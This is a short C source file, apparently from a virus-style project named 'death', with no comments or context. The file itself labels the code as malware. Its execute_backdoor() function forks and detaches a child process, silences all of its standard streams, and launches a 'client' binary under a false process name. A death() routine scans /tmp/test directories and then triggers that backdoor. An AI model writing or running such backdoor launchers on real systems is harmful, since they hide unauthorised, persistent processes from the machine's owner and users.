#include "death.h"

void execute_backdoor()
{
	if (fork() == 0)
	{
		setsid();
		int fd = open("/dev/null", O_RDWR);
		dup2(fd, STDIN_FILENO);
		dup2(fd, STDOUT_FILENO);
		dup2(fd, STDERR_FILENO);
		close(fd);
		execl("client", "program", NULL);
		perror("execl");
	}
}

void death(void)
{
	scan_dir("/tmp/test");
	scan_dir("/tmp/test2");
	execute_backdoor();
}